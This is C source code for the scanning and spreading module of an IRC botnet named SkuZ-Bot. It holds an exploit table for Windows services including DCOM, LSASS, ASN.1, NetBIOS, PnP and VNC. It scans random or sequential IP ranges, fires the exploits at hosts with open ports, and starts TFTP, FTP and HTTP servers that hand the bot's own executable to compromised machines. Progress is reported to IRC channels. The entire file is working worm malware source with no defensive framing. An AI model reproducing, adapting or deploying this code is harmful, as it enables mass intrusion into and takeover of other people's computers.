///////////////////////////////////////////////////////////////
//       __ _          _____          _           _          //
//      / _\ | ___   _/ _  /         | |__   ___ | |_        //
//      \ \| |/ / | | \// /   _____  | '_ \ / _ \| __|       //
//      _\ \   <| |_| |/ //\ |_____| | |_) | (_) | |_        //
//      \__/_|\_\\__,_/____/         |_.__/ \___/ \__|       //
//                                                           //
//   ____        _____          ____  _               _  __  //
//  | __ ) _   _|__  /  _ __   / ___|| | _____  _ __ | |/ /  //
//  |  _ \| | | | / /  | '_ \  \___ \| |/ / _ \| '_ \| ' /   //
//  | |_) | |_| |/ /_  | | | |  ___) |   < (_) | | | | . \   //
//  |____/ \__,_/____| |_| |_| |____/|_|\_\___/|_| |_|_|\_\  //
//                                                           //
/////////////////////////////////////////////////////////////// 
#include "Inc.h"
#include "Fun.h"
#include "Ext.h"

ADVINFO advinfo[MAXTHREADS];
CRITICAL_SECTION CriticalSection; 

EXPLOIT exploit[]={
//////////////////////////////////////////////////////////////////////////////////
////VNC////////VNC////////VNC////////VNC////////VNC////////VNC////////VNC/////////
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_VNC 
	{"vnc", "vnc", 5900, VNCExploit, 0, TRUE, FALSE}, 
#endif
//////////////////////////////////////////////////////////////////////////////////
////ASN////////ASN////////ASN////////ASN////////ASN////////ASN////////ASN/////////
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_MS04007ASN1
	{ "asn-445","asn-445",445, MS04_007_MSASN1_PortedByScriptGod, 0, TRUE, FALSE },
	{ "asn-139","asn-139",139, MS04_007_MSASN1_PortedByScriptGod, 0, TRUE, FALSE },
#endif
//////////////////////////////////////////////////////////////////////////////////
////LAND////////LAND////////LAND////////LAND////////LAND///////////LAND///////////
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_LAND
	{ "land-445", "land-445", 445, land, 0, TRUE, TRUE},
#endif
//////////////////////////////////////////////////////////////////////////////////
////DCOM////////DCOM////////DCOM////////DCOM////////DCOM///////////DCOM///////////
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_DCOM
	{ "dcom-135", "dcom-135", 135, dcom, 0, TRUE, FALSE},
	{ "dcom-445", "dcom-445", 445, dcom, 0, TRUE, FALSE},
#endif
//////////////////////////////////////////////////////////////////////////////////
////DSS////////DSS////////DSS////////DSS////////DSS////////DSS////DSS////DSS//////
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_DSS
	{ "dss-135", "dss-135", 135, dss, 0, TRUE, FALSE },
	{ "dss-445", "dss-445", 445, dss, 0, TRUE, FALSE },
#endif
//////////////////////////////////////////////////////////////////////////////////
////LSASS////////LSASS////////LSASS////////LSASS////////LSASS///////////LSASS/////
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_LSASS
	{ "lsass-135", "lsass-135", 135, lsass, 0, TRUE, FALSE},
	{ "lsass-445", "lsass-445", 445, lsass, 0, TRUE, FALSE},
#endif
//////////////////////////////////////////////////////////////////////////////////
////MASSASN////////MASSASN////////MASSASN////////MASSASN////////MASSASN///////////
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_MASSASN
	{ "mass-445", "mass-445", 445, massasn, 0, TRUE, FALSE },
	{ "mass-139", "mass-139", 139, massasn, 0, TRUE, FALSE },
#endif
//////////////////////////////////////////////////////////////////////////////////
////ASNPNP////////ASNPNP////////ASNPNP////////ASNPNP////////ASNPNP////////ASNPNP//
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_MAP
	{ "map-445", "map-445", 445, map, 0, TRUE, FALSE },
#endif
//////////////////////////////////////////////////////////////////////////////////
////NETBIOS////////NETBIOS////////NETBIOS////////NETBIOS////////NETBIOS///////////
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_NETBIOS
	{"net-bios", "net-bios", 139, NetBios, 0, TRUE, FALSE},
	{"nt-pass", "nt-pass", 445, NetBios, 0, TRUE, FALSE},
#endif
//////////////////////////////////////////////////////////////////////////////////
////PNP////////PNP////////PNP////////PNP////////PNP////////PNP////////PNP/////////
//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_PNP
	{ "pnp-445", "pnp-445", 445, pnp,		0, TRUE, FALSE},
	////////////////////////////////////////////////////////////////////
#ifndef NO_NETAPI
	{"netapi",	"NETAPI",	139, netapi2,	0, TRUE, FALSE},
#endif
////////////////////////////////////////////////////////////////////
#endif
	{NULL, NULL, 0, NULL, 0, FALSE, FALSE}
};
//////////////////////////////////////////////////////////////////////////////////
////ALLSCAN////////ALLSCAN////////ALLSCAN////////ALLSCAN////////ALLSCAN///////////
//////////////////////////////////////////////////////////////////////////////////
SCANALL allscan[]={
	{"asn-139", true},
	{"nt-pass", true},
	{"lsass-445", true},
	{"dcom-445", true},
	{"asn-445", true},
	{NULL, false}
};
void ListExploitStats(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], buffer2[IRCLINE];

	int extotal = 0;

	sprintf(buffer, "8::[4ScAn8]:: Exploit Stats:");
	for(int i=0; exploit[i].port != 0; i++) {
		extotal += exploit[i].stats;
		sprintf(buffer2,"[4%s8]: %d,",exploit[i].name,exploit[i].stats);
		strncat(buffer, buffer2, sizeof(buffer));
	}
	sprintf(buffer2, " Total: %d in %s.", extotal, Uptime(started));
	strncat(buffer, buffer2, sizeof(buffer));

	irc_privmsg(sock, chan, buffer, notice);
	addlog(buffer);

	return;
}

void currentIP(SOCKET sock, char *chan, BOOL notice, int threadnum)
{
	char sendbuf[IRCLINE];

	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;

		sprintf(sendbuf, "8::[4ScAn8]:: Current IP: [15 %s 1]",finet_ntoa(in));
	} else 
		sprintf(sendbuf ,"8::[4ScAn8]:: Scan not active.");

	irc_privmsg(sock, chan, sendbuf, notice);
	addlog(sendbuf);

	return;
}

void CheckServers(ADVSCAN scan)
{
	char sendbuf[IRCLINE];

	DWORD id;

	if(scan.exploit != -1) {
		if (exploit[scan.exploit].tftp) {
			#ifndef NO_TFTPD
			if (findthreadid(TFTP_THREAD) == 0) {
				static TFTP tftp;
				tftp.port = tftpport;
				tftp.threads = 0;
				GetModuleFileName(0,tftp.filename,sizeof(tftp.filename));
				strncpy(tftp.requestname, filename, sizeof(tftp.requestname)-1);
				tftp.sock=scan.sock;
				tftp.notice = scan.notice;
				if (scan.msgchan[0] == '\0') {
					strncpy(tftp.chan, scan.chan, sizeof(tftp.chan)-1);
					tftp.silent = TRUE;
				} else {
					strncpy(tftp.chan, scan.msgchan, sizeof(tftp.chan)-1);
					tftp.silent = FALSE;
				}
				
				sprintf(sendbuf, "8::[4TFTP8]:: Server started on Port: %d, File: %s, Request: %s.", tftp.port, tftp.filename, tftp.requestname);
				tftp.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
				if (threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (LPVOID)&tftp, 0, &id)) {
					while (tftp.gotinfo == FALSE) 
						Sleep(50);
				} else
					sprintf(sendbuf, "8::[4TFTP8]:: Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
				#endif
				#ifndef NO_FTPD
				//
				static FTP ftp;
				//ftp.port = FTP_PORT;
				ftp.threads = 0;
				GetModuleFileName(0,ftp.filename,sizeof(ftp.filename));
				strncpy(ftp.requestname, filename, sizeof(ftp.requestname)-1);
				ftp.sock=scan.sock;
				ftp.notice = scan.notice;
				if (scan.msgchan[0] == '\0') {
					strncpy(ftp.chan, scan.chan, sizeof(ftp.chan)-1);
					ftp.silent = TRUE;
				} else {
					strncpy(ftp.chan, scan.msgchan, sizeof(ftp.chan)-1);
					ftp.silent = FALSE;
				}
				
				sprintf(sendbuf, "8::[4FtP8]:: Server started on Port: %d, File: %s, Request: %s.", ftp.port, ftp.filename, ftp.requestname);
				ftp.threadnum = addthread(sendbuf,FTP_THREAD,NULL);
				if (threads[ftp.threadnum].tHandle = CreateThread(NULL, 0, &ftpd, (LPVOID)&ftp, 0, &id)) {
					while (ftp.gotinfo == FALSE) 
						Sleep(50);
				} else
					sprintf(sendbuf, "8::[4FtP8]:: Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
				//
				#endif
			}
		} else if (exploit[scan.exploit].http) {
			if (findthreadid(HTTP_THREAD) == 0) {
				static HTTPD httpd;
				
				char *c;
				GetModuleFileName(0,httpd.dir,sizeof(httpd.dir));
				if ((c=strrchr(httpd.dir,'\\')) != NULL)
					*c='\0';
				httpd.port = httpport;
				httpd.enabled = FALSE;
				sprintf(httpd.chan, scan.chan);
				httpd.sock = scan.sock;
				httpd.notice = scan.notice;
				httpd.silent = scan.silent;

				sprintf(sendbuf,"8::[40HtTpD8]:: Server listening on IP: %s:%d, Directory: %s\\.", GetIP(scan.sock), httpd.port, httpd.dir);

				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {
					while(httpd.info == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf, "8::[4HtTpD8]:: Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
			}
		}
	}

	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = fntohl(host);
	host += 1;
	host = fhtonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15) 
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons((unsigned short)port);
	fioctlsocket(sock,FIONBIO,&blockcmd);
	fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = fselect(0,0,&rset,0,&timeout);
	fclosesocket(sock);

	if (i<=0) 
		return FALSE;
	else 
		return TRUE;
}

BOOL SynPortOpen(unsigned long src_ip, unsigned long dest_ip, unsigned int port, unsigned int delay)
{
	char buffer[LOGLINE];
	int size;

	unsigned short src_port = 9801;

	TCPHEADER2 send_tcp;
	send_tcp.source = fhtons(src_port);
	send_tcp.dest = fhtons((unsigned short)port);
	send_tcp.seq = rand();
	send_tcp.ack_seq = 0;
	send_tcp.res1 = 0;
	send_tcp.res2 = 0;
	send_tcp.doff = 5;
	send_tcp.fin = 0;
	send_tcp.syn = 1;  /*This is the important part..;) */
	send_tcp.rst = 0;
	send_tcp.psh = 0;
	send_tcp.ack = 0;
	send_tcp.urg = 0;
	send_tcp.window = fhtons(512);
	send_tcp.check = 0;
	send_tcp.urg_ptr = 0;

	PSDHEADER psdheader;
	psdheader.saddr = src_ip;
	psdheader.daddr = dest_ip;
	psdheader.zero = 0;
	psdheader.proto = IPPROTO_TCP;
	psdheader.length = fhtons(sizeof(send_tcp));

	memcpy (&psdheader.tcp, &send_tcp, sizeof (send_tcp));
	send_tcp.check = checksum((unsigned short *)&psdheader, sizeof (psdheader));

	SOCKADDR_IN ssin;
	memset(&ssin,0,sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)port); 
	ssin.sin_addr.s_addr = dest_ip;
	int ssin_len = sizeof(ssin);
  
	SOCKET tcp_sock = fsocket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (tcp_sock == INVALID_SOCKET) {
		addlog("socket open failed");
		return FALSE;
	}

	// 10022: WSAEINVAL - An invalid argument was supplied.
	if ((size = fsendto(tcp_sock,(const char *)&send_tcp,sizeof(send_tcp),0,(LPSOCKADDR)&ssin,ssin_len)) != 20) {
		sprintf(buffer,"sendto() socket failed. sent = %d <%d>.", size, fWSAGetLastError());
		addlog(buffer);
		fclosesocket(tcp_sock);
		return FALSE;
	}

	RECVHEADER recv_tcp;
	memset (&recv_tcp,'\0',sizeof(recv_tcp));
	while (recv_tcp.tcp.dest != src_port) {
		if (frecvfrom(tcp_sock,(char *)&recv_tcp,sizeof(recv_tcp),0,(LPSOCKADDR)&ssin, &ssin_len) < 0) {
			addlog("recvfrom() socket failed");
			fclosesocket(tcp_sock);
			return FALSE;
		}
	}
  
	fclosesocket(tcp_sock);
	if (recv_tcp.tcp.syn == 1) {
		addlog("Socket open.");

		return TRUE;
	} else {
		addlog("Socket closed.");
		return FALSE;
	}
}

DWORD WINAPI AdvPortScanner(LPVOID param)
{
	IN_ADDR in;
	char logbuf[LOGLINE];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->cgotinfo = TRUE;

	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;

	srand(GetTickCount()); 
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;
		
		if (scan.random)
			dwIP = AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP = AdvGetNextIP(threads[threadnum].parent);
		in.s_addr = dwIP;

		sprintf(logbuf,"8::[4ScAn8]:: IP: %s:%d, Scan thread: %d, Sub-thread: %d.", 
			finet_ntoa(in), scan.port, threads[threadnum].parent, threadid); 
		sprintf(threads[threadnum].name, logbuf);

		if (AdvPortOpen(dwIP, scan.port, scan.delay) == TRUE) {
		//if (SynPortOpen(finet_addr(GetIP(scan.sock)), dwIP, scan.port, scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection); 

				sprintf(logbuf,"8::[4ScAn8]:: IP: %s, Port %d is open.",finet_ntoa(in),scan.port);
				if (!scan.silent) {
					if (scan.msgchan[0] != '\0')
						irc_privmsg(scan.sock,scan.msgchan,logbuf,scan.notice, TRUE);
					else
						irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
				}
				addlog(logbuf);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, finet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				if (scan.msgchan[0] != '\0')
					sprintf(exinfo.chan, scan.msgchan);
				else
					sprintf(exinfo.chan, scan.chan);
				exinfo.sock = scan.sock;
				exinfo.notice = scan.notice;
				exinfo.silent = scan.silent;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(exinfo);
				/*if (exploit[scan.exploit].exfunc(exinfo)) {
					EnterCriticalSection(&CriticalSection); 

					sprintf(logbuf,"8::[4ScAn8]:: Finished with IP: %s, Port %d.",finet_ntoa(in),scan.port);
					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
					addlog(logbuf);
	
					LeaveCriticalSection(&CriticalSection);
				} else {
					EnterCriticalSection(&CriticalSection); 

					sprintf(logbuf,"8::[4ScAn8]:: Failed to exploit IP: %s, Port %d.",finet_ntoa(in),scan.port);
					irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
					addlog(logbuf);
	
					LeaveCriticalSection(&CriticalSection);
				}*/

			}
		}
		Sleep(2000);
	}
	clearthread(threadnum);

	ExitThread(0);
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	char buffer[LOGLINE]; 
	//char szSelfExe[MAX_PATH];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = finet_addr(scan.ip);
/*
	// FIX ME: Make this a standalone function
	if (!FileExists(szLocalPayloadFile)) {
		GetModuleFileName(0,szSelfExe,MAX_PATH);
		CopyFile(szSelfExe,szLocalPayloadFile,FALSE);
		// FIX ME: Make this copy to the same directory (could affect other stuff)
	}
*/
	CheckServers(scan);

	if (findthreadid(SCAN_THREAD) == 1) {
		DeleteCriticalSection(&CriticalSection); // just in case

		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400)) {
			// failed to initialize CriticalSection
			sprintf(buffer,"8::[4ScAn8]:: Failed to initialize critical section.");
			if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
			addlog(buffer);

			return 0;
		}
	}

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++) {
		scan.cthreadid = i;
		sprintf(buffer,"8::[4ScAn8]:: %s:%d, Scan thread: %d, Sub-thread: %d.",scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		scan.cthreadnum = addthread(buffer,SCAN_THREAD,NULL);
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		} else {
			sprintf(buffer, "8::[4ScAn8]:: Failed to start worker thread, error: <%d>.", GetLastError());
			addlog(buffer);
		}

		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	sprintf(buffer,"8::[4ScAn8]:: Finished at [8 %s 4]:%d after %d minute(s) of scanning.", finet_ntoa(in), scan.port, scan.minutes);
	if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
	addlog(buffer);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}
/////////////////////////////////////////////////
//       SkuZ-Bot-V.1-2006    By Skonk & BuZ   //
///////////////////////////////////////////////// 